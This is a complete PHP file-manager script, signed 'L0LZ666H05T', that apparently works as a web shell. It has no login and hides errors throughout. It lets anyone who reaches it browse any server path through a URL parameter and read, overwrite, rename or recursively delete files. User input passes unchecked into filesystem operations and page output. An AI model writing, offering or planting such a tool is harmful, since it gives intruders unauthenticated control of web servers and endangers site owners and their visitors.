<style type="text/css">
	body {
		font-family:Arial;
		color:#fff;
	} div.filemanager {
		width:60%;
		background:#1c1c1c;
		border-radius:5px;
		padding:7px;
		box-shadow:0px 0px 10px black;
	} tr.filemanager {
		background:#444;
	} select.filemanager {
		width:100%;
		background:#444;
		border:1px solid #444;
		color:#fff;
	} a {
		color:#fff;
		text-decoration:none;
	} textarea.filemanager {
		background:transparent;
		width:100%;
		height:400px;
		color:#fff;
		resize:none;
		border:1px solid #444;
	} textarea.filemanager:focus {
		box-shadow:0px 0px 5px #444;
	} input[type=submit].filemanager {
		background:#444;
		color:#fff;
		font-weight:bold;
		border:1px solid #444;
		padding:5px;
	} th {
		padding:7px;
	} div.success {
		background:green;
		text-align:center;
		padding:5px;
	} div.failed {
		background:red;
		text-align:center;
		padding:5px;
	} tr.hover:hover {
		background:#555;
	} .icon {
		width:23px;
		height:23px;
	} input[type=submit]:hover {
		cursor:pointer;
	} input[type=text].filemanager {
		background:#444;
		border:1px solid #444;
		padding:5px;
		color:#fff;
	}
</style>
<?php
@define("SEP", @DIRECTORY_SEPARATOR);
@define("PATH", @cwd());
?>
<center>
<div class="filemanager">
	<table class="filemanager" width="100%">
		<?php 
		function cwd() {
			if (isset($_GET['path'])) {
				$cwd = @str_replace('\\', '/', $_GET['path']);
				@chdir($cwd);
			} else {
				$cwd = @str_replace('\\', '/', @getcwd());
			} return $cwd;
		} function pwd() {
			$dir = @explode("/", @cwd());
			foreach ($dir as $key => $pwd) {
				print("<a href='?path=");
				for ($i=0; $i <= $key ; $i++) { 
					print($dir[$i]);
					if ($i != $key) {
						print("/");
					}
				} print("'>".$pwd."</a>/");
			}
		} function perms($filename) {
			$perms = fileperms($filename);
			switch ($perms & 0xF000) {
				case 0xC000: // socket
				    $info = 's';
				    break;
				case 0xA000: // symbolic link
				    $info = 'l';
                    break;
                case 0x8000: // regular
                    $info = 'r';
                    break;
                case 0x6000: // block special
                    $info = 'b';
                    break;
                case 0x4000: // directory
                    $info = 'd';
                    break;
                case 0x2000: // character special
                    $info = 'c';
                    break;
                case 0x1000: // FIFO pipe
                    $info = 'p';
                    break;
                default: // unknown
                    $info = 'u';
			} $info .= (($perms & 0x0100) ? 'r' : '-');
              $info .= (($perms & 0x0080) ? 'w' : '-');
              $info .= (($perms & 0x0040) ?
              	(($perms & 0x0800) ? 's' : 'x' ) :
                (($perms & 0x0800) ? 'S' : '-'));
              $info .= (($perms & 0x0020) ? 'r' : '-');
              $info .= (($perms & 0x0010) ? 'w' : '-');
              $info .= (($perms & 0x0008) ?
                (($perms & 0x0400) ? 's' : 'x' ) :
                (($perms & 0x0400) ? 'S' : '-'));
              $info .= (($perms & 0x0004) ? 'r' : '-');
              $info .= (($perms & 0x0002) ? 'w' : '-');
              $info .= (($perms & 0x0001) ?
                (($perms & 0x0200) ? 't' : 'x' ) :
                (($perms & 0x0200) ? 'T' : '-'));
             return $info;
		} function permission($filename, $perms) {
			if (!is_writable($filename)) {
				?> <font color="red"><?php print $perms ?></font> <?php
			} else {
				?> <font color="green"><?php print $perms ?></font> <?php
			}
		} function action($typePost, $typeFile, $filename, $value) {
	        $action = "<option value='?path=".PATH."&do=".$typePost."&".$typeFile."=".$filename."'>".$value."</option>";
	        return $action;
        } function redirect($path, $cwd) {
        	?>
        	<script type="text/javascript">
        		window.location='?<?php print $path ?>=<?php print $cwd ?>';
        	</script>
        	<?php
        } function success($text) {
        	?>
        	<div class="success"><?php print $text ?></div>
        	<?php
        } function failed($text) {
        	?>
        	<div class="failed"><?php print $text ?></div>
        	<?php
        } function back($dir, $value) {
        	$back = "<option value='?path=".$dir."'>".$value."</option>";
        	return $back;
        } function getPath() {
			$getPath = @scandir(PATH);
			return $getPath;
		} function size($filename) {
			$size = @filesize($filename)/1024;
			$size = @round($size, 3);
			if ($size > 1024) {
				$size = @round($size/1024,2). 'MB';
			} else {
				$size = $size. 'KB';
			} return $size;
		} function delete($post, $filename) {
			if ($_GET['do'] == $post) {
				if (@is_dir($filename)) {
					$scandir = @scandir($filename);
					foreach ($scandir as $object) {
						if ($object != '.' && $object != '..') {
							if (@is_dir($filename.SEP.$object)) {
								@delete($filename.SEP.$object);
							} else {
								@unlink($filename.SEP.$object);
							}
						}
					} if (@rmdir($filename)) {
						return true;
					} else {
						return false;
					}
				} else {
					if (@unlink($filename)) {
						return true;
					} else {
						return false;
					}
				}
			}
		} function edit($post, $filename) {
			if ($_GET['do'] == $post) {
				?>
				<tr>
					<th colspan="2">FILE EDITOR</th>
				</tr>
				<?php
				if (isset($_POST['submit'])) {
					$fp = @fopen($filename, 'w');
					if (@fwrite($fp, $_POST['text'])) {
						?><tr><td colspan="2"><?php @success("Success"); ?></td></tr><?php
					} else {
						?><tr><td colspan="2"><?php @failed("Failed"); ?></td></tr><?php
					}
				} $text = @htmlspecialchars(@file_get_contents($filename));
				?>
				<form method="post">
					<tr class="filemanager">
						<td>
							Filename : <?php print $filename ?>
						</td>
						<td>
							<select class="filemanager" onclick="if (this.value) window.location=(this.value)">
								<option selected></option>
								<?php print @action("rename", "file", $filename, "Rename") ?>
								<?php print @action("delete", "file", $filename, "Delete") ?>
								<?php print @back(PATH, "BACK") ?>
							</select>
						</td>
					</tr>
					<tr class="filemanager">
						<td colspan="2">
							<textarea class="filemanager" name="text" placeholder="Nothing Script"><?php print $text ?></textarea>
						</td>
					</tr>
					<tr class="filemanager">
						<td colspan="2">
							<input class="filemanager" style="width:100%;" type="submit" name="submit">
						</td>
					</tr>
				</form>
				<?php
				exit();
			}
		} function renames($post, $filename) {
			if ($_GET['do'] == $post) {
				?>
				<tr>
					<th colspan="2">RENAME</th>
				</tr>
				<?php
				if (isset($_POST['submit'])) {
					$renames = @rename($filename, $_POST['newname']);
					if ($renames) {
						@redirect("path", PATH);
					} else {
						?><tr><td colspan="2"><?php @failed("Failed"); ?></td></tr><?php
					}
				}
				?>
				<form method="post">
					<tr class="filemanager">
						<td>
							<input class="filemanager" style="width:100%;" type="text" name="newname" value="<?php print @basename($filename) ?>">
						</td>
						<td>
							<select class="filemanager" onclick="if (this.value) window.location=(this.value)">
								<option selected></option>
								<?php print @action("edit", "file", $filename, "Edit") ?>
								<?php print @action("delete", "file", $filename, "Delete") ?>
								<?php print @back(PATH, "BACK") ?>
							</select>
						</td>
					</tr>
					<tr class="filename">
						<td colspan="2">
							<input type="submit" name="submit" style="width:100%;" class="filemanager">
						</td>
					</tr>
				</form>
				<?php
				exit();
			}
		}

		// Action
		@edit("edit", $_GET['file']);
		@delete("delete", $_GET['file']);
		@renames("rename", $_GET['file']);
		?>
		<tr>
			<th colspan="4">
				<a href="<?php print $_SERVER['SCRIPT_NAME'] ?>">FILEMANAGER</a>
			</th>
		</tr>
		<tr class="filemanager">
			<th colspan="4"><?php print @pwd() ?></th>
		</tr>
		<tr class="filemanager">
			<th>Filename</th>
			<th>Permission</th>
			<th>Size</th>
			<th>Action</th>
		</tr>
		<?php
		foreach (@getPath() as $dir) {
			if (!is_dir($dir)) continue;
			if ($dir === '.' || $dir === '..') continue;
			?>
			<tr class="filemanager hover">
				<td> 
					<img src="http://aux.iconspalace.com/uploads/folder-icon-256-1787672482.png" class="icon">
					<a href="?path=<?php print PATH.SEP.$dir ?>"><?php print $dir ?></a>
				</td>
				<td><center><?php print @permission($dir, @perms($dir)) ?></center></td>
				<td><center>--</center></td>
				<td>
					<select class="filemanager" onclick="if (this.value) window.location=(this.value)">
						<option selected></option>
						<?php print @action("delete", "file", $dir, "Delete") ?>
						<?php print @action("rename", "file", $dir, "Rename") ?>
					</select>
				</td>
			</tr>
			<?php
		}
		foreach (@getPath() as $file) {
			if (!is_file($file)) continue;
			?>
			<tr class="filemanager hover">
				<td> 
					<img src="https://pngimage.net/wp-content/uploads/2018/06/file-png-12.png" class="icon">
					<?php print $file ?>
				</td>
				<td><center><?php print @permission($file, @perms($file)) ?></center></td>
				<td><center><?php print @size($file) ?></center></td>
				<td>
					<select class="filemanager" onclick="if (this.value) window.location=(this.value)">
						<option selected></option>
						<?php print @action("edit", "file", $file, "Edit") ?>
						<?php print @action("delete", "file", $file, "Delete") ?>
						<?php print @action("rename", "file", $file, "Rename") ?>
					</select>
				</td>
			</tr>
			<?php
		}
		?>
		<tr>
			<th colspan="4">
				&copy; <?php print @date("Y") ?> - L0LZ666H05T
			</th>
		</tr>
	</table>
</div>
